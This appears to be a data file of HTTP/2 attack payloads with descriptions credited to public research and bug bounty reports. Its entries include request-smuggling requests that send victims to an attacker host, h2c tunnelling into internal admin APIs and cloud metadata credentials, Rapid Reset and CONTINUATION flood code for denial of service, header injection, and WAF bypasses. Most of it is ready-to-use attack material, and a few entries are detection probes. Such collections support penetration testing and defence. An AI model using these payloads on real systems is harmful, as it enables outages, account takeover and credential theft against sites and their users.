description: HTTP/2 specific attack payloads — real-world PoCs from PortSwigger Research (James Kettle), BishopFox h2cSmuggler, CVE-2023-44487/CVE-2024-27983 GitHub repos, and documented bug bounty findings against Netflix, AWS ALB, Netlify, and Verizon

payloads.payload:
POST /n HTTP/2
:authority: TARGET
content-length: 4

abcdGET /n HTTP/1.1
Host: ATTACKER
Foo: bar
payloads.description: H2.CL desync — Netflix $20k bounty (CVE-2021-21295, Netty). Front-end uses H2 data-frame length, back-end trusts Content-Length. Incorrect CL causes back-end to treat overflow as new request. Redirects victim to attacker host for account takeover. Source: James Kettle, PortSwigger Research 'HTTP/2: The Sequel is Always Worse'.

payloads.payload:
POST /identity/XUI HTTP/2
:authority: TARGET
transfer-encoding: chunked

0

GET /oops HTTP/1.1
Host: ATTACKER
Content-Length: 10

x=
payloads.description: H2.TE desync — Verizon $7k bounty (AWS ALB). HTTP/2 RFC forbids Transfer-Encoding but AWS ALB passed it through during H2→H1 downgrade. Back-end used chunked TE over front-end-inserted CL. Intercepted OAuth codes via Referer leak. Source: James Kettle, PortSwigger Research.

payloads.payload:
POST / HTTP/2
:authority: TARGET
transfer-encoding: chunked

0

GET /robots.txt HTTP/1.1
X-Ignore: x
payloads.description: H2.TE desync detection probe — safe variant. If response contains robots.txt content, target is vulnerable to H2.TE smuggling. Adapted from James Kettle's HTTP Request Smuggler Burp extension detection strategy.

payloads.payload:
POST / HTTP/2
:authority: TARGET
content-length: 0

GET /robots.txt HTTP/1.1
X-Ignore: x
payloads.description: H2.CL desync detection probe — safe variant. Front-end sees CL:0 and empty body, back-end sees the smuggled GET after H2→H1 downgrade. Source: PortSwigger Web Security Academy lab methodology.

URL prefix injection via :scheme pseudo-header — Netlify vulnerability. :scheme is meant to be 'http' or 'https' but accepts arbitrary bytes. Some systems use it to construct URLs without validation, enabling cache poisoning. Real finding by James Kettle.
SSRF via :scheme pseudo-header — some systems use :scheme to build the routing URL, creating SSRF. Works even without H2 downgrading. Source: PortSwigger Research.

Duplicate :path pseudo-headers — real servers accept multiple :path headers but process them inconsistently. WAF/proxy may check second :path while back-end uses first. Observed on real websites by James Kettle.

H2 :authority vs Host header conflict — both are technically allowed in HTTP/2. Real servers are inconsistent about which they use. Enables host-header attacks (cache poisoning, password reset poisoning, SSRF). Documented by James Kettle.

Request line injection via :method — Apache mod_proxy allows spaces in :method, enabling request-line injection after H2→H1 downgrade. Bypasses <ProxyMatch '/admin'> deny rules. CVE-2021-33193. Source: James Kettle, PortSwigger Research.
Apache ProxyPass subfolder escape via :method injection — escape ProxyPass /public restriction by injecting path into :method. CVE-2021-33193. Source: James Kettle.

Header name splitting via colon — some H2 servers allow colons in header names. After H2→H1 downgrade, the trailing colon appended during conversion is ignored by back-ends expecting a port. Enables host-header attacks. Source: James Kettle.

Host-header attack via header name splitting — colon in header name creates dual Host after downgrade. Servers ignore port portion, routing to attacker domain. Source: James Kettle, PortSwigger Research.

Header tampering via line folding — H2 header names starting with space + back-end supporting deprecated line folding = ability to tamper with internal headers (request-id, X-Forwarded-For, etc.). Real servers reflected tampered internal headers. Source: James Kettle.

payloads.payload:
GET / HTTP/1.1
Host: TARGET
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
payloads.description: H2C smuggling detection probe — BishopFox h2cSmuggler tool. Tests if proxy forwards h2c upgrade headers. On HTTPS, positive results are almost always true positives. Used against real targets in bug bounty. Source: github.com/BishopFox/h2csmuggler (@theBumbleSec).

payloads.payload:
POST /api/internal/user/permissions HTTP/2
:authority: backend
content-type: application/json
x-system-user: true

{"user":128457, "role": "admin"}
payloads.description: H2C smuggling exploitation — after establishing h2c tunnel through proxy, access internal API endpoints with admin headers. Bypasses all proxy-level access controls. From BishopFox h2cSmuggler documentation.
H2C smuggling to AWS IMDSv2 metadata — exploit h2c tunnel to reach EC2 metadata service. First PUT to get token, then GET with token for credentials. From BishopFox h2cSmuggler examples.
H2C smuggling IP spoof to admin dashboard — combine h2c tunnel with X-Forwarded-For/X-Real-IP to access IP-restricted internal dashboards. From BishopFox h2cSmuggler examples.

payloads.payload:
h2_conn = H2Connection(config=H2Configuration(client_side=True))
h2_conn.initiate_connection()
headers = [(':method','GET'),(':authority','TARGET'),(':scheme','https'),(':path','/')]
h2_conn.send_headers(stream_id, headers)
h2_conn.reset_stream(stream_id)
payloads.description: HTTP/2 Rapid Reset (CVE-2023-44487) — open H2 stream, send headers, immediately RST_STREAM. Repeat at scale (100k+ streams). Server allocates resources per stream but client cancels before response. CVSS 7.5. Exploited in the wild Oct 2023 at 398M req/s (Google). Source: github.com/threatlabindonesia/CVE-2023-44487 using hyper-h2 library.

payloads.payload:
with httpx.Client(http2=True, verify=False, timeout=10) as client:
    response = client.get(url)
    if response.http_version == 'HTTP/2':
        # Target supports HTTP/2 — vulnerable to rapid reset
        pass
payloads.description: HTTP/2 support detection probe using httpx — prerequisite check before rapid reset. If response.http_version == 'HTTP/2', target speaks H2 and may be vulnerable. Source: github.com/threatlabindonesia/CVE-2023-44487.

payloads.payload:
for stream_id in range(1, 10001, 2):
    h2_conn.send_headers(stream_id, [(':method','GET'),(':authority','TARGET'),(':scheme','https'),(':path','/')])
    h2_conn.reset_stream(stream_id)
    sock.sendall(h2_conn.data_to_send())
payloads.description: Rapid Reset at scale — loop 5000 streams sending HEADERS+RST_STREAM per iteration. Stream IDs must be odd (client-initiated). The hyper-h2 library handles HPACK encoding. Source: adapted from github.com/nxenon/cve-2023-44487 (H2SpaceX).

payloads.payload: HEADERS frame (stream_id=1, NO END_HEADERS flag) + [CONTINUATION frame (1 byte header fragment, NO END_HEADERS)] × 10000
payloads.description: HTTP/2 CONTINUATION flood (CVE-2024-27983, CVE-2024-27316, CVE-2023-45288, CVE-2024-28182) — send HEADERS without END_HEADERS, then thousands of CONTINUATION frames each with tiny header fragments. Server MUST buffer ALL fragments before processing. Affects Node.js, Apache, Go, nghttp2. Source: nowotarski.info + github.com/Ampferl/poc_http2-continuation-flood.

CONTINUATION flood raw frame — Go-based PoC sends minimal CONTINUATION frames (type=0x09, no END_HEADERS flag=0x00) with single-byte payloads. 10k frames per connection. Source: github.com/Vos68/HTTP2-Continuation-Flood-PoC, adapted from nowotarski.info disclosure.

payloads.payload:
:method: GET
:path: /
:authority: TARGET
foo: bar
transfer-encoding: chunked
payloads.description: H2 header value CRLF injection — inject \r\n into H2 header value. H2 binary framing should prevent this but some H2→H1 downgrades fail to sanitize, creating a new header after downgrade. James Kettle notes this works on some real front-ends.

HPACK dynamic table exhaustion — large header value that gets indexed in HPACK dynamic table. Repeat with different header names to fill 4096-byte default table, forcing frequent evictions. Increases CPU cost of HPACK encoding/decoding.

HTTP/2 SETTINGS abuse — set header table to 0 (force uncompressed headers), max streams to 1 (serialize all requests), window size to 0 (freeze data transfer). Degrades server performance without violating protocol.

Flow control abuse — send max WINDOW_UPDATE on connection level (id=0), advertising infinite receive capacity. Then never consume data, causing server-side buffer bloat. Combined with large responses, exhausts server memory.

H2 CONNECT to cloud metadata — abuse HTTP/2 CONNECT method to tunnel to cloud metadata endpoints (AWS/GCP/Azure). Some H2 proxies allow CONNECT without authorization. Pair with h2cSmuggler for full SSRF chain.

HTTP/2 connection preface on HTTP/1.1 port — send H2 magic bytes to probe for H2 support. Some servers respond with SETTINGS frame (H2 supported) or crash/hang (implementation bug). The 24-byte preface is: PRI * HTTP/2.0

SM

.

payloads.payload:
POST / HTTP/2
:authority: TARGET
content-length: 0
transfer-encoding: chunked

5
HELLO
0
payloads.description: H2.CL+TE dual header desync — send both Content-Length and Transfer-Encoding in H2 (both technically forbidden). Some proxies strip one but not the other during downgrade. Tests for CL.TE or TE.CL disagreement between front/back-end.

payloads.payload:
POST / HTTP/2
:authority: TARGET
content-type: application/x-www-form-urlencoded
content-length: 150

0

GET / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 5

x=
payloads.description: Tunnelled request smuggling — even when front-end validates CL, H2 tunnelling can smuggle requests through encrypted H2 connections that proxies can't inspect. The back-end processes the smuggled request as separate. Source: PortSwigger Web Security Academy advanced labs.

payloads.payload:
:method: CONNECT
:path: /
:authority: TARGET
:protocol: websocket
sec-websocket-version: 13
sec-websocket-key: dGhlIHNhbXBsZSBub25jZQ==
payloads.description: H2 Extended CONNECT for WebSocket (RFC 8441) — upgrade H2 connection to WebSocket, bypassing WAF rules that don't inspect WebSocket frames. After upgrade, send payloads in WebSocket frames that bypass HTTP-layer WAFs.

payloads.payload:
GET /admin HTTP/1.1
Host: TARGET
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
payloads.description: H2C smuggling path brute-force — BishopFox recommends scanning directory lists through the h2c tunnel: /admin/, /api/, /internal/, /flag/, /system/, /debug/. Once tunnel is established, all requests bypass proxy ACLs. Source: github.com/BishopFox/h2csmuggler.

payloads.payload: PING frame × 10000 (8 bytes each, opaque data: 0x0000000000000001 incrementing)
payloads.description: HTTP/2 PING flood — server MUST respond to every PING with PING ACK. 10k PINGs = 10k mandatory responses. Amplifies CPU on server side. Low bandwidth cost for attacker (8 bytes per PING).

GraphQL introspection via H2 Content-Type mismatch — send JSON body with text/plain Content-Type in H2. WAFs inspecting only application/json skip this. After H2→H1 downgrade, back-end may still parse JSON regardless of Content-Type.

payloads.payload:
POST / HTTP/2
:authority: TARGET
transfer-encoding: chunked
content-length: 4

1
Z
Q
payloads.description: H2 TE/CL timing desync — send conflicting TE and CL in H2. If front-end uses CL (reads 4 bytes 1\r\nZ) and back-end uses chunked (reads chunk '1' = 'Z', then waits for next chunk), the 'Q' is left in the buffer as a prefix for the next request. Detection variant — a timeout indicates disagreement.
